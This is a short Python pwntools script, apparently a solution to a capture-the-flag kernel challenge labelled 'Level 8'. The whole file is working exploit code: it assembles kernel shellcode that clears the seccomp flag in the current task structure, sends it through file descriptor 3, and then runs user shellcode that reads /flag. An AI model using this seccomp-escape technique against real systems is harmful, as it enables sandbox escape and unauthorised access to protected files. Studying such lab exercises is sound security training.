# Level 8
import pwn
from dojotool import find_challenge, tee


def one_round(io: pwn.process) -> None:
    shellcraft = pwn.shellcraft  # type: ...
    # clear the seccomp filter
    kshellcode = pwn.asm("""
mov rax, qword ptr gs:[0x15d00]
and qword ptr [rax], ~(1 << 8)
ret
""")
    ushellcode = [
        shellcraft.write(3, kshellcode, len(kshellcode)),
        shellcraft.cat('/flag'),
    ]
    ushellcode = pwn.asm("".join(ushellcode))
    io.send(ushellcode)

def ctf() -> None:
    root_bin = find_challenge()
    with pwn.process(root_bin, raw=True, level="error") as io:
        tee(io)
        one_round(io)
        io.recvrepeat()


if __name__ == "__main__":
    ctf()
